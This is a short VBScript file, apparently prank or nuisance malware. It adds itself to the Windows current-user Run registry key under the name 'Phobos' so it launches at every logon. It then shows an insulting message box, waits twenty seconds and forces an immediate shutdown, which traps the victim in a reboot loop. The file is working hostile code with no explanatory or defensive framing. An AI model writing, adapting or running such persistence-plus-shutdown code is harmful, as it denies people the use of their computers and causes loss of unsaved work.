dim AutoRun
set AutoRun = CreateObject("WScript.Shell")
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"
type_name = "REG_SZ"
key_name = "Phobos"
key_data = wscript.ScriptFullName
AutoRun.RegWrite RegPath & key_name , key_data , type_name
msgbox"You are such a fucking idiot"
Wscript.Sleep 20000
Set ws=CreateObject("wscript.shell")
ws.Run("shutdown -s -f -t 0")